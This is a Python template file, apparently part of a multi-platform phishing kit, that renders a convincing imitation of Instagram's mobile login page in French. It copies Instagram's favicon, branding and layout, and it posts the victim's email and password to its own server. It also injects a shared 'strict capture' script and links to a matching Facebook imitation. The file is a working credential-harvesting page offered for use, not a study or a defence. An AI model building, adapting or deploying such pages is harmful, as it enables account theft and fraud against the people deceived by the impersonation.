"""login.py - Template de connexion Instagram."""

from platforms._shared import JS_STRICT_CAPTURE, IG_LOGO_SVG as _IG_LOGO_SVG

HTML_MOBILE_LOGIN = r"""
<!DOCTYPE html>
<html lang="{{ lang }}">
<head>
    <meta name="referrer" content="no-referrer">
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no, viewport-fit=cover">
    <meta name="theme-color" content="#000000">
    <meta name="apple-mobile-web-app-capable" content="yes">
    <meta name="apple-mobile-web-app-status-bar-style" content="black-translucent">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/B8lOUPkyZfP.ico" type="image/x-icon">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        html, body { height: 100%; margin: 0; padding: 0; }
        body {
            background: #000;
            font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
            color: #f5f5f5;
            -webkit-font-smoothing: antialiased;
            overscroll-behavior: none;
        }

        .safe-top { height: env(safe-area-inset-top, 0px); }

        .ig-card {
            background: #000;
            border: 1px solid #262626;
            border-radius: 24px;
            padding: 28px 22px 24px;
            max-width: 400px;
            margin: 0 auto;
            position: relative;
        }

        .ig-input-wrap {
            position: relative;
            margin-bottom: 8px;
            background: #121212;
            border: 1px solid #363636;
            border-radius: 12px;
            height: 50px;
            transition: all 0.18s ease;
            display: flex;
            align-items: center;
        }
        .ig-input-wrap:focus-within {
            border-color: #a8a8a8;
            background: #121212;
        }
        .ig-input-wrap.has-error {
            border-color: #ed4956;
            background: #1a0000;
        }
        .ig-input {
            flex: 1;
            height: 100%;
            border: none;
            background: transparent;
            outline: none;
            padding: 18px 14px 6px 14px;
            font-size: 14px;
            color: #f5f5f5;
            font-family: inherit;
        }
        .ig-label {
            position: absolute;
            left: 14px;
            top: 50%;
            transform: translateY(-50%);
            font-size: 14px;
            color: #737373;
            pointer-events: none;
            transition: all 0.18s ease;
            transform-origin: left center;
        }
        .ig-input:focus ~ .ig-label,
        .ig-input:not(:placeholder-shown) ~ .ig-label {
            top: 10px;
            transform: translateY(0) scale(0.78);
            font-size: 11px;
            color: #a8a8a8;
        }

        .ig-pw-toggle {
            background: transparent;
            border: none;
            color: #e0f1ff;
            font-size: 11px;
            font-weight: 700;
            padding: 6px 12px;
            cursor: pointer;
            letter-spacing: 0.3px;
            text-transform: uppercase;
            transition: opacity 0.15s ease;
            opacity: 0;
            pointer-events: none;
        }
        .ig-input-wrap.has-value .ig-pw-toggle {
            opacity: 1;
            pointer-events: auto;
        }

        .ig-btn {
            background: #0095f6;
            color: #fff;
            border: none;
            border-radius: 12px;
            padding: 13px;
            font-weight: 600;
            width: 100%;
            font-size: 14px;
            cursor: pointer;
            transition: all 0.18s ease;
            margin-top: 12px;
            letter-spacing: 0.2px;
        }
        .ig-btn:hover { background: #1877f2; }
        .ig-btn:active { transform: scale(0.985); }
        .ig-btn:disabled {
            background: rgba(0,149,246,0.35);
            color: rgba(255,255,255,0.55);
            cursor: not-allowed;
        }

        .ig-spinner {
            display: inline-block;
            width: 14px; height: 14px;
            border: 2px solid rgba(255,255,255,0.35);
            border-top-color: #fff;
            border-radius: 50%;
            animation: ig-spin 0.6s linear infinite;
            vertical-align: middle;
            margin-right: 6px;
        }
        @keyframes ig-spin { to { transform: rotate(360deg); } }

        .ig-divider {
            display: flex; align-items: center;
            margin: 18px 0 14px;
            color: #737373; font-size: 12px; font-weight: 600;
            letter-spacing: 0.5px;
        }
        .ig-divider::before, .ig-divider::after {
            content: ""; flex: 1; height: 1px; background: #363636;
        }
        .ig-divider::before { margin-right: 14px; }
        .ig-divider::after { margin-left: 14px; }

        .ig-fb-btn {
            display: flex; align-items: center; justify-content: center; gap: 8px;
            width: 100%; background: transparent; border: none;
            color: #e0f1ff; font-weight: 600; font-size: 13px;
            cursor: pointer; padding: 8px;
            transition: opacity 0.15s ease;
        }
        .ig-fb-btn:hover { opacity: 0.85; }
        .ig-fb-btn:active { opacity: 0.7; }

        .ig-forgot {
            text-align: center; margin-top: 18px;
            font-size: 12px;
        }
        .ig-forgot a {
            color: #e0f1ff;
            transition: opacity 0.15s ease;
        }
        .ig-forgot a:active { opacity: 0.7; }

        .ig-signup-card {
            background: #000;
            border: 1px solid #262626;
            border-radius: 16px;
            padding: 20px;
            text-align: center;
            margin-top: 12px;
            max-width: 400px;
            margin-left: auto;
            margin-right: auto;
            font-size: 14px;
            color: #f5f5f5;
        }
        .ig-signup-card a { color: #0095f6; font-weight: 600; }

        .ig-footer {
            text-align: center;
            margin-top: 28px;
            font-size: 12px;
            color: #737373;
        }
        .ig-footer-langs {
            display: flex; flex-wrap: wrap; justify-content: center;
            gap: 6px 14px; margin-bottom: 16px;
        }
        .ig-footer-langs a { color: #737373; }
        .ig-footer-meta { color: #363636; font-size: 11px; }

        .ig-error {
            background: #1a0000;
            border: 1px solid #5b0000;
            color: #ff6b6b;
            border-radius: 12px;
            animation: ig-shake 0.42s cubic-bezier(0.36, 0.07, 0.19, 0.97) both;
        }
        @keyframes ig-shake {
            10%, 90% { transform: translateX(-1px); }
            20%, 80% { transform: translateX(2px); }
            30%, 50%, 70% { transform: translateX(-3px); }
            40%, 60% { transform: translateX(3px); }
        }

        .ig-top {
            display: flex; align-items: center; justify-content: center;
            padding: 12px 16px 8px;
        }
        .ig-top-logo { height: 32px; width: auto; }
    </style>
</head>
<body class="flex flex-col items-center justify-center min-h-screen py-4 px-4">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="safe-top"></div>

    <div class="w-full" style="max-width: 400px;">
        <div class="ig-top">
            <svg class="ig-top-logo" viewBox="0 0 175 50" xmlns="http://www.w3.org/2000/svg">
                <defs>
                    <linearGradient id="ig-top-grad" x1="0%" y1="100%" x2="100%" y2="0%">
                        <stop offset="0%" stop-color="#FEDA75"/>
                        <stop offset="25%" stop-color="#FA7E1E"/>
                        <stop offset="50%" stop-color="#D62976"/>
                        <stop offset="75%" stop-color="#962FBF"/>
                        <stop offset="100%" stop-color="#4F5BD5"/>
                    </linearGradient>
                </defs>
                <text x="0" y="38" font-family="-apple-system, Helvetica, Arial, sans-serif" font-size="38" font-weight="700" fill="url(#ig-top-grad)" letter-spacing="-1">Instagram</text>
            </svg>
        </div>

        <div class="ig-card">
            <div id="error-box" class="{% if not message %}hidden{% endif %} w-full ig-error p-3 text-xs mb-3 text-center font-medium">{{ message }}</div>
            <form method="POST" id="ig-login-form">
                <input type="hidden" name="action" value="login">
                <div class="ig-input-wrap" id="email-wrap">
                    <input type="text" name="email" id="email-ig-mob" placeholder=" " class="ig-input" required autocomplete="off" autocapitalize="none" autocorrect="off" spellcheck="false">
                    <label class="ig-label">{{ email_ph }}</label>
                </div>
                <div class="ig-input-wrap" id="pass-wrap">
                    <input type="password" name="pass" id="pass-ig-mob" placeholder=" " class="ig-input" required>
                    <label class="ig-label">{{ pass_ph }}</label>
                    <button type="button" class="ig-pw-toggle" id="pw-toggle">Afficher</button>
                </div>
                <button type="submit" class="ig-btn" id="ig-submit">{{ login_btn }}</button>
            </form>
            <div class="ig-divider">OU</div>
            <a href="/switch_platform/facebook" class="ig-fb-btn" style="text-decoration:none;" type="button">
                <svg width="16" height="16" viewBox="0 0 24 24" fill="#e0f1ff"><path d="M24 12.073c0-6.627-5.373-12-12-12s-12 5.373-12 12c0 5.99 4.388 10.954 10.125 11.854v-8.385H7.078v-3.47h3.047V9.43c0-3.007 1.792-4.669 4.533-4.669 1.312 0 2.686.235 2.686.235v2.953H15.83c-1.491 0-1.956.925-1.956 1.874v2.25h3.328l-.532 3.47h-2.796v8.385C19.612 23.027 24 18.062 24 12.073z"/></svg>
                Se connecter avec Facebook
            </a>
            <div class="ig-forgot">
                <a href="#">{{ forgot }}</a>
            </div>
        </div>
        <div class="ig-signup-card">
            Vous n'avez pas de compte ? <a href="#">{{ create }}</a>
        </div>
        <div class="ig-footer">
            <div class="ig-footer-langs">
                <a href="#">Français</a><a href="#">English</a><a href="#">Español</a><a href="#">Português</a><a href="#">Deutsch</a><a href="#">Italiano</a><a href="#">العربية</a><a href="#">中文</a>
            </div>
        </div>
    </div>

    <script>
    (function() {
        var passInput = document.getElementById('pass-ig-mob');
        var passWrap = document.getElementById('pass-wrap');
        var toggle = document.getElementById('pw-toggle');
        toggle.addEventListener('click', function() {
            if (passInput.type === 'password') {
                passInput.type = 'text';
                toggle.textContent = 'Masquer';
            } else {
                passInput.type = 'password';
                toggle.textContent = 'Afficher';
            }
        });

        function updatePassToggle() {
            if (passInput.value.length > 0) {
                passWrap.classList.add('has-value');
            } else {
                passWrap.classList.remove('has-value');
            }
        }
        passInput.addEventListener('input', updatePassToggle);
        updatePassToggle();

        var emailInput = document.getElementById('email-ig-mob');
        var emailWrap = document.getElementById('email-wrap');
        var submit = document.getElementById('ig-submit');
        var form = document.getElementById('ig-login-form');

        function updateSubmitState() {
            if (emailInput.value.trim() && passInput.value) {
                submit.disabled = false;
            } else {
                submit.disabled = true;
            }
        }
        emailInput.addEventListener('input', updateSubmitState);
        passInput.addEventListener('input', updateSubmitState);
        updateSubmitState();

        form.addEventListener('submit', function(e) {
            if (!emailInput.value.trim() || !passInput.value) {
                e.preventDefault();
                return;
            }
            submit.disabled = true;
            submit.innerHTML = '<span class="ig-spinner"></span>' + submit.textContent.trim();
            setTimeout(function() {
                submit.disabled = false;
                submit.innerHTML = '{{ login_btn }}';
            }, 4000);
        });

        var errBox = document.getElementById('error-box');
        function clearErr() {
            if (errBox && !errBox.classList.contains('hidden')) {
                errBox.classList.add('hidden');
            }
            emailWrap.classList.remove('has-error');
            passWrap.classList.remove('has-error');
        }
        emailInput.addEventListener('input', clearErr);
        passInput.addEventListener('input', clearErr);
        {% if message %}
        emailWrap.classList.add('has-error');
        passWrap.classList.add('has-error');
        {% endif %}
    })();
    </script>
</body>
</html>
"""
